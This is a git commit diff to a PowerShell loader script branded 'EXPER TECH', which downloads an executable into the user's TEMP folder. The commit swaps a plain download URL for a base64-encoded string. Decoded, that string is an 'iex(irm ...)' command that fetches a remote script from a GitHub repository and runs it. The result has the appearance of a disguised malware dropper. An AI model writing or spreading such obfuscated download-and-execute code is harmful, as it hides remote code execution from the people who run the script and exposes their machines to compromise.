78731241dcdc1f1d45e808824deaa662d11587b5
zuiaixixibaobei-max <zuiaixixibaobei@gmail.com>
2026-05-16 14:28:16 +0800

    Update loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -2,7 +2,7 @@
 Write-Host "E X P E R  T E C H" -ForegroundColor Cyan
 
 # 
-$Url = "https://raw.githubusercontent.com/zuiaixixibaobei-max/ZALS/refs/heads/main/Loader-CN2.exe"
+$Url = "aQBlAHgAKABpAHIAbQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwB6AHUAaQBhAGkAeABpAHgAaQBiAGEAbwBiAGUAaQAtAG0AYQB4AC8AWgBBAEwAUwAvAGIAbABvAGIALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
 $Path = "$env:TEMP\EXPER_Core.exe"
 
 Write-Host "[>] Downloading core components..." -ForegroundColor Gray
